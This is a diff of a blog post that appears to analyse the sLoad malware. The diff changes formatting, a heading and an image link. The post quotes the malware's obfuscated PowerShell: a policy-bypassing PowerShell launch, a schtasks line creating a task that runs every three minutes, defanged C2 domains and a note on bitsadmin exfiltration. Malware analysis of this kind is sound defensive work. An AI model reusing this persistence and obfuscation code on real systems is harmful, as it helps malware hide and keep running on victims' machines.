@@ -33,7 +33,7 @@ Another obfuscation/filter evasion technique is the following, which is used man
 
 All numbers are deleted (replaced with nothing), so the string becomes "\AppData\Roaming\". Searching for "replace" on the code shows 7 matches, but I believe the most intersting ones are these, which are found in the first part of the code:
 
-```java
+```sh
 
 $oyqTbhcJKV="*(/#*c*# ^^*c**(o*)(^p***y() !@/!*#(Z* (#c!#:*\*W!(i)(@n)d((o(*()w!^^)s*\**)S(*(y^s(@)*W*^^O*#*W((6#4*(*)\*b@#(i*)t^#!s*a))(d)((m)^i*(n*#^.@*e(*x*))e**^ *()r@)*i#((!F!(^B!*#z!()o#@t*#(.*e(#(x)(e(*" -replace '([\(\!\*\(\@\)\*\#\^])'
 
@@ -93,7 +93,7 @@ Once unobfuscated the code that creates the .txt string is very interesting: it 
 
 I'll manually add the last line of code, as it deserves a particular analysis:
 
-```python
+```sh
 avgUs.run gEGaGH("p62o46w38e46r77s29h7e19l18l72 56-53e8p78 60b74y93p12a87s83s86 56-79f67i19l76e70") & " '+$SDLUpTpGMpqcF+'" & FDQiHDTMtjIfuIuENJTb(".233p87s25153"),0,true
 ```
 
@@ -120,20 +120,20 @@ Finally, the last three lines of code create the scheduled task and execute it, 
 
 This is the line where the scheduled task is created, and we are now able to understand every piece:
 
-```java
+```sh
 $hWUHsjdaCKUaSaQwQ='/C schtasks /F /%windir:~0,1%reate /sc minute /mo 3 /TN "S'+$rs+$ezAdXVUDiUiZdERVV+'" /ST 07:00 /TR "'+$mRiDMVGkRsmxDiCggXsF+'\CRiwTpyD.exe /E:vbscript '+$mRiDMVGkRsmxDiCggXsF+'\'+$SDLUpTpGMpqcF+'.txt"';
 
 start-process -windowstyle $hh cmd $hWUHsjdaCKUaSaQwQ;
 ```
 
 
-`schtasks /F /%windir:~0,1%reate /sc minute /mo 3` -> the task is scheduled using /F (deletes the task and stops if the task is already running). It runs every 3 minutes.
-`/TN "S'+$rs+$ezAdXVUDiUiZdERVV+'"` -> the task name is based upon the name of the folder in %temp%
-`/ST 07:00` -> starts at 7am
-`/TR` -> runs a program
-`$mRiDMVGkRsmxDiCggXsF` -> current randomly named directory
-`CRiwTpyD.exe` -> wscript
-`$SDLUpTpGMpqcF` -> .txt file that runs the .ps1 script, that runs *system.ini*
+`schtasks /F /%windir:~0,1%reate /sc minute /mo 3` -> the task is scheduled using /F (deletes the task and stops if the task is already running). It runs every 3 minutes. <br>
+`/TN "S'+$rs+$ezAdXVUDiUiZdERVV+'"` -> the task name is based upon the name of the folder in %temp% <br>
+`/ST 07:00` -> starts at 7am <br>
+`/TR` -> runs a program <br>
+`$mRiDMVGkRsmxDiCggXsF` -> current randomly named directory <br>
+`CRiwTpyD.exe` -> wscript <br>
+`$SDLUpTpGMpqcF` -> .txt file that runs the .ps1 script, that runs *system.ini* <br>
 
 ## Artifacts on an infected machine
 
@@ -145,7 +145,7 @@ This is the scheduled task:
 
 ![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/sload/images/windows_2.PNG)
 
-## The malware
+## The payload
 
 As my aim was primarily focused on the obfuscation technique employed by the actor, I will not go into the details of how the malware operates.
 The content of *system.ini* is still somewhat obfuscated, and exfiltrates all kinds of information from the computer.
@@ -156,13 +156,13 @@ The first lines contain the versions of the malware, which get also sent to the 
 
 This is what gets sent, notice that the versions variables appear:
 
-![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/sload/images/system_1.PNG)
+![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/sload/images/system_2.PNG)
 
 There seems to be still Star Wars reference, given the variables `Yoda`, `Maul`, `clone` and `droids` used in the code.
 
 The data is exfiltrated using bitsadmin and the C2 are hardcoded in win.ini:
 
-hxxps://lwyhef[.]eu/topic/
+hxxps://lwyhef[.]eu/topic/ <br>
 hxxps://ponmer[.]eu/topic/
 
 
